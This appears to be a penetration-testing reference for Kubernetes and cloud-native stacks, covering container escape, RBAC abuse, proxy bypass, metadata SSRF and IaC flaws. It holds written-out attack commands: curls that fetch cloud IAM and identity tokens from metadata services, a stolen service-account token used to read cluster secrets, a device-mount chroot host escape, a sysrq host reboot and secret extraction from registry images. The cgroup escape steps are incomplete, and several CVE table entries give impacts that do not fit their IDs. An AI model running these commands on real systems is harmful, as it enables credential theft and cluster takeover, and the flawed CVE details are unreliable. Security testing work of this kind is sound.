# Cloud-Native Security Reference

**Purpose:** Comprehensive reference for testing cloud-native application security — container/K8s misconfigurations, IaC flaws, RBAC abuse, sidecar/proxy bypass, service mesh, serverless, pod escape, supply chain, and cloud metadata SSRF.

**Schema version:** 1  
**Skill version:** paladin-probe@v2

---

## Table of Contents

1. [Attack Surface](#1-attack-surface)
2. [Container Escape](#2-container-escape)
3. [Kubernetes RBAC Abuse](#3-kubernetes-rbac-abuse)
4. [Pod / Deployment Misconfig](#4-pod--deployment-misconfig)
5. [Sidecar / Proxy Bypass](#5-sidecar--proxy-bypass)
6. [Service Mesh](#6-service-mesh)
7. [Serverless](#7-serverless)
8. [IaC Flaws](#8-iac-flaws)
9. [Cloud Metadata Abuse](#9-cloud-metadata-abuse)
10. [Supply Chain (K8s)](#10-supply-chain-k8s)
11. [Container Registry](#11-container-registry)
12. [Real-World CVEs](#12-real-world-cves)
13. [Tooling](#13-tooling)
14. [Testing Methodology](#14-testing-methodology)
15. [Payload Quick Reference](#15-payload-quick-reference)
16. [YAML Fingerprint Tables](#16-yaml-fingerprint-tables)

---

## 1. Attack Surface

### Where Cloud-Native Vectors Hide

| Surface | Vector | Risk |
|---------|--------|------|
| Container runtime | Privileged mode, host PID, volume mounts | Pod escape |
| K8s API server | Anonymous auth, misconfigured RBAC | Cluster takeover |
| etcd | Unauthenticated access | All secrets leaked |
| Service mesh (Istio/Linkerd) | mTLS misconfig, authz bypass | Lateral movement |
| Ingress controller | Path traversal, CRLF injection | Service exposure |
| Sidecar proxy | Envoy bypass, HTTP/2 downgrade | Policy bypass |
| Serverless function | Event injection, timeout abuse | Invocation chain |
| IaC templates | Hardcoded secrets, over-permissive SG | Foundation flaws |
| Cloud metadata | SSRF → IMDS | Credential theft |
| Container registry | Public repos, outdated tags | Malicious base images |

### K8s Enumeration Probe

```bash
# Check if anonymous auth is enabled
curl -sk https://k8s-api:6443/api/v1/pods
# If returns pod list -> anonymous auth enabled

# Check etcd accessibility
curl -sk https://etcd:2379/version
# If returns version -> etcd exposed

# Enumerate namespaces (if authenticated)
kubectl get namespaces
kubectl get pods --all-namespaces
```

### Cloud Metadata Probes

```bash
# AWS
curl -s http://169.254.169.254/latest/meta-data/
# GCP
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
# Azure
curl -s -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

---

## 2. Container Escape

### Privileged Mode Check

```bash
cat /proc/1/status | grep CapEff
# If 0000003fffffffff -> full capabilities -> privileged
capsh --print | grep sys_admin
# If present -> can mount devices
```

### Host PID Namespace

```bash
# Can see host processes
ps aux
cat /proc/1/environ  # Host process environment
```

### Host Mount / HostPath

```bash
# Check mounts
mount | grep /var/lib/kubelet
# Can read host filesystem
ls /host/etc/kubernetes/pki/
```

### Device Mount Escape

```bash
# If privileged or CAP_SYS_ADMIN
fdisk -l
mkdir /mnt && mount /dev/sda1 /mnt
chroot /mnt
# -> Full host access
```

### cgroup Escape via release_agent (Container Breakout)

```bash
# Within container
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path="/tmp/cgrp"
echo "/host$host_path/escape.sh" > /tmp/release_agent
```

### /proc/sysrq-trigger

```bash
# If running as root
echo b > /proc/sysrq-trigger  # Reboot host
```

### Detection Signals

- Container can see host processes
- Container has capabilities beyond net_bind_service
- Host filesystem mounted at known paths
- Can interact with device files

---

## 3. Kubernetes RBAC Abuse

### Over-Permissive Role Check

```yaml
# Dangerous verbs on *
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: cluster-admin-clone
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
```

### What to Check

```bash
# List current permissions
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets --all-namespaces

# If pods/create allowed -> can schedule privileged pod -> cluster escape
# If secrets/get allowed -> can read all secrets -> cluster admin
```

### Secret Enumeration

```bash
# If list secrets is permitted
kubectl get secrets --all-namespaces
kubectl get secrets -n kube-system
kubectl get secret <name> -o yaml | yq '.data | map_values(@base64d)'
```

### Token Abuse (Stolen SA Token)

```bash
# From compromised pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk https://$KUBERNETES_SERVICE_HOST/api/v1/secrets \
  -H "Authorization: Bearer $TOKEN"
```

### Privilege Escalation Chains

| Starting Permission | Attack | Escalates To |
|--------------------|--------|-------------|
| pods/exec | Exec into privileged pod | Host access |
| pods/create + secrets/list | Mount secret in new pod | Secret read |
| deployments/rollback | Rollback to version with secrets | Secret read |
| nodes/proxy | Proxy to kubelet API | Node access |
| persistentvolumes/create | Create PV with hostPath | Host FS access |

### Detection Signals

- ServiceAccount has cluster-admin or wildcard permissions
- Pod runs with `automountServiceAccountToken: true` unnecessarily
- Can list/watch secrets across namespaces
- Can create pods/deployments

---

## 4. Pod / Deployment Misconfig

### SecurityContext Violations

```yaml
spec:
  containers:
  - name: app
    securityContext:
      privileged: true                    # Pod escape
      allowPrivilegeEscalation: true      # Can escalate
      readOnlyRootFilesystem: false       # Can write to host
      capabilities:
        add: ["SYS_ADMIN", "NET_ADMIN"]    # Dangerous caps
      runAsUser: 0                        # Root
      runAsNonRoot: false                 # Bypass non-root
```

### Host Sharing

```yaml
spec:
  hostPID: true           # Can see host processes
  hostNetwork: true       # Can access host network
  hostIPC: true           # Can access host IPC
  volumes:
  - name: hostfs
    hostPath:
      path: /             # Full host FS access
      type: Directory
```

### Pod Spec Probe

```bash
# Dump pod spec
kubectl get pod <name> -o yaml | grep -A20 securityContext
kubectl get pod <name> -o yaml | grep -E "hostPID|hostNetwork|hostIPC|privileged"
kubectl get pod <name> -o yaml | grep hostPath
```

### Detection Signals

- Privileged containers
- hostPID / hostNetwork / hostIPC enabled
- Root user in container
- HostPath volumes
- `allowPrivilegeEscalation: true`

---

## 5. Sidecar / Proxy Bypass

### Envoy Config Probe

```bash
# Read Envoy config
curl -s http://127.0.0.1:15000/config_dump
# Check for admin endpoint
curl -s http://127.0.0.1:15000/logging
```

### Direct Pod-to-Pod Bypass

```bash
# If sidecar only intercepts inbound, outbound may bypass
# Connect directly to service (works if no strict mTLS)
kubectl run tmp --rm -it --image=alpine -- wget -qO- http://other-service:8080
```

### HTTP/2 Downgrade

```bash
# Force HTTP/1.1 to bypass Envoy HTTP/2 policies
curl --http1.1 http://service:8080/
```

### mTLS Stripping Probe

```bash
# If destination rule has DISABLE mTLS -> can send plain HTTP
curl http://service.namespace.svc.cluster.local:8080/
```

### Detection Signals

- Sidecar admin endpoint exposed
- Direct pod-to-pod communication without sidecar intercept
- mTLS disabled in destination rules
- HTTP/1.1 connections accepted alongside HTTP/2

---

## 6. Service Mesh

### Istio AuthorizationPolicy Bypass

```yaml
# Cluster-scoped allow — if not covering all paths:
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: deny-all
spec:
  action: ALLOW  # Should be DENY
```

### Check AuthorizationPolicy Coverage

```bash
# List policies
kubectl get authorizationpolicies --all-namespaces
kubectl get authorizationpolicies -n istio-system

# Check for any "ALLOW" without "DENY" default
kubectl get authorizationpolicies -A -o yaml | grep "action: ALLOW"
```

### mTLS Mode Enumeration

```bash
# PeerAuthentication resources
kubectl get peerauthentications --all-namespaces -o yaml
kubectl get destinationrules --all-namespaces -o yaml | grep trafficPolicy
```

### Detection Signals

- AuthorizationPolicy missing default DENY
- PeerAuthentication with `mode: PERMISSIVE` or `DISABLE`
- DestinationRule with `tls: DISABLE`
- Default namespace not covered by mesh policy

---

## 7. Serverless

### Event Injection

```json
{
  "body": "INJECTED_EVENT: malicious payload",
  "headers": {
    "X-Forwarded-For": "127.0.0.1"
  }
}
```

### Execution Timeout Abuse

```bash
# Trigger long-running operation
curl -X POST https://lambda-url/ \
  -d '{"operation": "read_large_file", "path": "/dev/urandom"}'
# If function hangs past timeout -> resource exhaustion
```

### Serverless Metadata Access

```bash
# AWS Lambda
curl -s http://169.254.169.254/latest/meta-data/
curl -s $AWS_LAMBDA_RUNTIME_API/runtime/invocation/next
```

### Event Chain Poisoning

```json
{
  "Records": [
    {
      "eventSource": "aws:sqs",
      "body": "DROP TABLE users; -- injected"
    }
  ]
}
```

### Detection Signals

- Function accesses cloud metadata
- Event-driven function accepts unvalidated input
- Execution timeout reached (resource DoS indicator)
- Function environment variables leakable

---

## 8. IaC Flaws

### Terraform

```hcl
# Security group with 0.0.0.0/0 ingress
resource "aws_security_group_rule" "bad" {
  type        = "ingress"
  from_port   = 0
  to_port     = 65535
  protocol    = "tcp"
  cidr_blocks = ["0.0.0.0/0"]
}

# S3 bucket with public access
resource "aws_s3_bucket_public_access_block" "bad" {
  bucket                  = aws_s3_bucket.data.id
  block_public_acls       = false
  block_public_policy     = false
  ignore_public_acls      = true
  restrict_public_buckets = false
}

# Hardcoded secret
resource "aws_db_instance" "db" {
  password = "super-secret-123"
}
```

### Helm Chart

```yaml
# Values.yaml with elevated defaults
privileged: true
serviceAccountName: cluster-admin
hostNetwork: true
```

### Detection Signals

- `0.0.0.0/0` or `::/0` in security group ingress
- S3 buckets with `block_public_* = false`
- Hardcoded passwords / API keys
- Overly permissive IAM policies (`Action: "*"`, `Resource: "*"`)
- K8s RBAC with `kind: ClusterRole` and verbs `["*"]`

---

## 9. Cloud Metadata Abuse

### AWS IMDS v1 (No Token Required)

```bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

### AWS IMDS v2 Bypass (Token Leak)

```bash
# If you can write X-Forwarded-For header to trigger IMDS calls
# or if a service/proxy forwards to IMDS
TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s http://169.254.169.254/latest/meta-data/ -H "X-aws-ec2-metadata-token: $TOKEN"
```

### GCP Metadata

```bash
# GCP metadata (requires Metadata-Flavor header)
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://target.com
```

### Azure Metadata

```bash
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### K8s Cloud Provider Metadata

```bash
# From a pod on EKS/GKE/AKS
# Check if IMDS is accessible from pod
curl -s --connect-timeout 2 http://169.254.169.254/
# If pod has hostNetwork: true -> always accessible
```

### Detection Signals

- IMDS accessible from application pods
- curl from pod to 169.254.169.254 returns data
- Application makes HTTP requests to internal AWS endpoints
- Metadata service endpoint in app logs

---

## 10. Supply Chain (K8s)

### Image Tag Mutable

```yaml
# Always pulls mutable tag — CVE exposure
image: nginx:latest
# Should be pinned
image: nginx@sha256:abc123...
```

### Image Pull Policy

```yaml
spec:
  containers:
  - name: app
    image: private.registry/app:v1.0
    imagePullPolicy: IfNotPresent  # Could use stale image
```

### Admission Controller Bypass

```bash
# Check if admission controller is enforcing
kubectl create deployment test --image=nginx
kubectl label ns default pod-security.kubernetes.io/enforce=restricted
kubectl create deployment test --image=nginx
# If both succeed -> admission controller misconfigured
```

### Detection Signals

- `latest` tag used
- Image not pinned by digest
- `ImagePullPolicy: Always` missing (for mutable tags)
- No Pod Security Admission or OPA/Gatekeeper
- Admission controller allows privileged defaults

---

## 11. Container Registry

### Public Registry Probe

```bash
# Check if registry is public
curl -s https://registry.example.com/v2/_catalog
# If returns catalog -> public registry
curl -s https://registry.example.com/v2/<repo>/tags/list
```

### Registry Pull/Leak

```bash
# If registry auth is weak
docker pull registry.example.com/private-app:latest
docker image save private-app:latest -o app.tar
# Extract and search for secrets
tar xf app.tar && find . -name "*.env" -exec cat {} \;
```

### Detection Signals

- Registry returns `_catalog` without auth
- Registry accessible from outside VPC
- Image tags suggest secrets (e.g. `app:prod-2024`)
- Dockerfile in layer history contains secrets

---

## 12. Real-World CVEs

| CVE | Year | Product | Impact |
|-----|------|---------|--------|
| CVE-2025-1974 | 2025 | Kubernetes Ingress-nginx | Admission RCE via annotation injection |
| CVE-2025-22870 | 2025 | Kubernetes proxy | Privilege escalation via proxy subpath |
| CVE-2024-9480 | 2024 | containerd | Pod escape via over-mounted /proc |
| CVE-2024-2476 | 2024 | K8s kubelet | Unauthenticated RCE via kubelet API |
| CVE-2024-21626 | 2024 | runc (Leaky Vessels) | Container escape via `/proc/self/fd` |
| CVE-2024-47535 | 2024 | Istio | Authorization bypass with wildcard hosts |
| CVE-2024-31457 | 2024 | Istio | Envoy crash via crafted HTTP/2 |
| CVE-2024-5654 | 2024 | GitLab + K8s integration | CI/CD pipeline K8s access bypass |
| CVE-2023-5528 | 2023 | K8s API server | RBAC bypass via subresource |
| CVE-2023-25173 | 2023 | containerd | Supplementary group privilege escalation |
| CVE-2023-3676 | 2023 | Azure Linux VM | VM extension RCE via IMDS |
| CVE-2023-44487 | 2023 | HTTP/2 (Envoy, nginx) | Rapid reset DoS |

---

## 13. Tooling

| Tool | Purpose |
|------|---------|
| kube-bench | CIS benchmark for K8s |
| kube-hunter | Security hunter for K8s |
| trivy | Scan containers, IaC, K8s manifests |
| kubeaudit | K8s manifest audit |
| popeye | K8s cluster sanitizer |
| k9s | K8s CLI with security context view |
| cloud_enum | Cloud resource enumeration |
| scoutsuite | Multi-cloud security audit |
| checkov | IaC scanning |
| deepfence | Container runtime security |
| falco | Runtime threat detection |
| cloudfox | Cloud exploitation toolkit |

---

## 14. Testing Methodology

### Phase 1: Cluster Enumeration

1. Check K8s API anonymous access
2. List namespaces, pods, services
3. Enumerate secrets (if RBAC allows)
4. Check etcd accessibility
5. Scan for metadata endpoints

### Phase 2: Pod Assessment

1. Check securityContext for privilege escalation
2. Check hostPID/hostNetwork/hostIPC
3. Check HostPath volumes
4. Validate image pull policy and tags
5. Check service account token permissions

### Phase 3: RBAC Audit

1. List current permissions (`kubectl auth can-i --list`)
2. Check ClusterRoleBindings for wildcards
3. Check RoleBindings for over-permissive roles
4. Test privilege escalation chains

### Phase 4: Network

1. Check if sidecar/proxy is bypassable
2. Check mTLS mode in PeerAuthentication
3. Check AuthorizationPolicy coverage
4. Test direct pod-to-pod communication

### Phase 5: Cloud Metadata

1. Probe IMDS from application context
2. Extract temporary credentials
3. Check if metadata access is restricted to specific services

### Phase 6: IaC Review

1. Scan for hardcoded secrets
2. Check security group / firewall rules
3. Check IAM policy over-permissions
4. Check S3/storage bucket access

---

## 15. Payload Quick Reference

```bash
# Privilege check
cat /proc/1/status | grep CapEff

# Host PID
cat /proc/1/environ

# Host filesystem access
ls /host/etc/kubernetes/pki/

# IMDSv1 (AWS)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2 (AWS)
TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s http://169.254.169.254/latest/meta-data/ -H "X-aws-ec2-metadata-token: $TOKEN"

# GCP metadata
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure metadata
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# RBAC check
kubectl auth can-i --list
kubectl get secrets --all-namespaces

# Pod spec dump
kubectl get pod <name> -o yaml | grep -A20 securityContext

# Envoy config
curl -s http://127.0.0.1:15000/config_dump

# Registry enumeration
curl -s https://registry.example.com/v2/_catalog
curl -s https://registry.example.com/v2/<repo>/tags/list
```

---

## 16. YAML Fingerprint Tables

```yaml
container_escape_privileged:
  probe: 'cat /proc/1/status | grep CapEff'
  detection: CapEff shows full capabilities (0000003fffffffff)

container_escape_hostpid:
  probe: 'ps aux | grep -v "\[" | head -20'
  detection: can see host processes (init, sshd, kubelet)

imds_v1_accessible:
  probe: 'curl -s http://169.254.169.254/latest/meta-data/'
  detection: returns EC2 metadata (instance-id, ami-id)

imds_v2_accessible:
  probe: 'curl -s -X PUT http://169.254.169.254/latest/api/token ...'
  detection: returns IMDSv2 token

k8s_anonymous_auth:
  probe: 'curl -sk https://K8S_API/api/v1/pods'
  detection: returns pod list without auth

k8s_rbac_overpermissive:
  probe: 'kubectl auth can-i --list'
  detection: shows wildcard or cluster-admin permissions

k8s_privileged_pod:
  probe: 'kubectl get pod <name> -o yaml | grep privileged'
  detection: "privileged: true"

sidecar_mtls_disabled:
  probe: 'curl http://service.namespace.svc:8080/'
  detection: direct HTTP works without mTLS

istio_authz_missing:
  probe: 'kubectl get authorizationpolicies --all-namespaces'
  detection: no AuthorizationPolicy or only ALLOW rules

registry_public:
  probe: 'curl -s https://registry.example.com/v2/_catalog'
  detection: returns repository list without auth
```
